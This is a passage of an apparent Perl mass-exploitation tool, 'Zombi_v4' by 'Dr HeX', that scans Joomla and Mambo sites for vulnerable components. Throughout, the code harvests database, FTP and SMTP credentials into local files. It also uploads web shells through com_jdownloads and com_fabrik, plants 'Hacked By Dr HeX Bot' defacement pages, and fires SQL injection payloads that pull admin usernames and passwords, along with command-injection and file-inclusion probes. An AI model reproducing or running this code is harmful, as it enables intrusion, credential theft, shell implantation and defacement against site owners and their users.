print color('bold white'),"Com hdflvplayer";
print color('bold white')," +++++++++++++++++++ ";
print color('reset');
print color('bold Yellow');
print "VULN";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Zombi_v4/Try_Manulle.txt');   
    print save "[hdflv] $site\n";   
    close(save);
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("Yellow"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("Yellow"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("Yellow"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("Yellow"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("Yellow"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("Yellow"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("Yellow"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("Yellow"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("Yellow"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("Yellow"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("Yellow"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("Yellow"),"\t[+]SMTP Host = $1 \n\n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com hdflvplayer";
print color('bold white')," +++++++++++++++++++ ";
print color('reset');
print color('bold red');
print "False";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}


################ Com Media #####################
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="v4hex.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$mediaup="$site/images/v4hex.txt";
$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/Hacked By Dr HeX Bot/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Media";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Get] => $mediaup\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$mediaup\n";
close (TEXT);
$def = $mediaup;
zoneh();
}else{

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Media";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

############################################################
sub com_content(){ 
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
             
print color('bold white'),"Com content +++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_user&view=reset&layout=confirm";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_search(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com search ++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_admin1(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com admin1 ++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.admin.html.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_admin2(){              print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com admin2 ++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.admin.html.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content1(){       print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com content1 ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content2(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com content2 ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_weblinks(){              print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com weblinks ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_weblinks&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_mailto(){              print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com mailto ++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_mailto&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content3(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com content3 ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content4(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com content4 ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	

sub com_users(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com users +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_users&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_installer(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com installer +++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_installer&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_search1(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com search1 +++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_poll(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com poll ++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_poll&task=results&id=14&mosmsg=DOS@HERE<<>AAA<><>";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_banners(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com banners +++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_banners&task=archivesection&id=0'+and+'1'='1::/index.php?option=com_banners&task=archivesection&id=0'+and+'1'='2";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_mailto1(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com mailto1 +++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_mailto&tmpl=mailto&article=550513+and+1=2+union+select+concat(username,char(58),password)+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--&Itemid=1";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_a6mambocredits(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com a6mambocredits ++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.a6mambocredits.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_a6mambohelpdesk(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com a6mambohelpdesk +++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.a6mambohelpdesk.php?mosConfig_live_site=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_advancedpoll(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com advancedpoll ++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.advancedpoll.php?mosConfig_live_site=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_akocomment(){             print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
 print color('bold white'),"com akocomment ++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.Akocomment.php?mosConfig_live_site=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_articles(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com articles ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/com_articles.php?absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_artlinks(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com artlinks ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/artlinks.dispnew.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_trade(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com trade +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/lang.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_bayesiannaivefilter(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com bayesiannaivefilter +++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/lang.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_babackup(){           print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
   print color('bold white'),"com babackup ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/Tar.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}

sub com_bsqsitestats(){            print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
  print color('bold white'),"com bsqsitestats ++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/Tar.php?mosConfig_bsqsitestats_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN	";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	##########################################################

################ comjdownloads #####################
sub comjdownloads(){
$file="v4jd.rar";
$filez="v4jd.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/v4.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Dr HeX", mail=>"pz@hotmail.com", filetitle =>"Dr HeX", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $shellpath\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$shellpath\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}


################ comjdownloads index #####################
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/v4.html.j';
$filee="v4jdhtml.rar";
$filezz="v4jd.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Wissem Mahfoud", mail=>"pz@hotmail.com", filetitle =>"Wissem Mahfoud", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Get] => $def\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
        }
}
else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";

}
}

################ comfabrik #####################
sub comfabrik(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $shell ="v4.php";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikupp="$site/media/v4.php";

$checkcomfabrikupp = $ua->get("$comfabrikupp")->content;
if($checkcomfabrikupp =~/Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik";
print color('bold white')," ++++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $comfabrikupp\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik";
print color('bold white')," ++++++++++++++++++++++++ ";
